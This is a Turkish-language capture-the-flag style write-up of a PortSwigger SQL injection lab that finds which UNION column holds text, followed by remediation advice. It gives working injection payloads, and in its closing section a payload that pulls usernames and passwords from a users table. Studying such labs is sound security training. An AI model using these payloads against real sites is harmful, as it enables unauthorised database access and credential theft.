# SQLi Lab #4: UNION attack — metin tutan sütunu bulma — 24.10.2026

> UNION'ın 2. adımı. Sütun sayısını (3) biliyoruz; şimdi hangi sütunun string taşıyabildiğini buluyoruz — çünkü çalınacak username/password birer metin ve ancak metin tutan bir sütunda ekranda görünür.

**Lab:** PortSwigger → SQL injection → UNION attacks → *Finding a column containing text* (Practitioner)
**Görev:** Lab'ın verdiği belirli bir rastgele metni, UNION ile sorgu çıktısında göründür.

## Çözüm
Enjeksiyon noktası: `?category=` filtresi.

**Adım 1 — sütun sayısı (tekrar):** `' ORDER BY 1--` ... `' ORDER BY 4--` → 4'te hata → **3 sütun**. (`' UNION SELECT NULL,NULL,NULL--` ile de teyit.)

**Adım 2 — metin sütununu bul:** Her pozisyona sırayla bir string koy, hata vereni ele:
```
' UNION SELECT 'TEST',NULL,NULL--   → hata (sütun 1 metin değil)
' UNION SELECT NULL,'TEST',NULL--   → ekranda göründü (sütun 2 METİN ✅)
' UNION SELECT NULL,NULL,'TEST'--   → hata (sütun 3 metin değil)
```
Bonus teyit: `' UNION SELECT 9,NULL,9--` çalıştı → sütun 1 ve 3 integer.

**Adım 3 — lab'ın istediği değeri göster:** Lab bir rastgele değer veriyor (ör. banner'da yazar). `'TEST'` yerine o değeri metin sütununa (2) koy:
```
' UNION SELECT NULL,'LABIN_VERDİĞİ_DEĞER',NULL--
```
Değer ekranda göründü → **Solved.** ✅

## Neden böyle (mantık)
- Yanlış sütuna string koyunca **tip uyuşmazlığı** (Kural 2) hatası patlar → bu hata, o sütunun metin olmadığını söyler. "Hata da bilgidir."
- Metin tutan sütun = ileride sızdırılacak string verinin (username/password) ekrana basılacağı taşıyıcı.
- Küçük ama kritik: lab rastgele, kullanıcıya özel bir değer ister — `'test'` ile sütunu bulursun ama lab'ı çözmek için **tam o değeri** basman gerekir (görevin birebir gereğini oku).

## 🛡️ Nasıl kapatılır (remediation)
Kök sebep ve çözüm yine aynı aile: **parameterized queries** (girdi SQL yapısına dokunamaz). Ek: tip uyuşmazlığı/DB hatalarını kullanıcıya ham göstermemek (generic error) saldırganın sütun tiplerini "hata üzerinden" haritalamasını zorlaştırır; least privilege ile UNION'la erişilebilen tabloları sınırla.

## Zincir bağı
- #3: kaç sütun (3). #4: hangi sütun metin (2).
- Sıradaki (#5 hedef): artık taşıyıcı sütunu da bildiğimize göre, gerçek veriyi çekmek — `' UNION SELECT NULL, username || '~' || password, NULL FROM users--` gibi, `users` tablosundan username/password sızdırma.
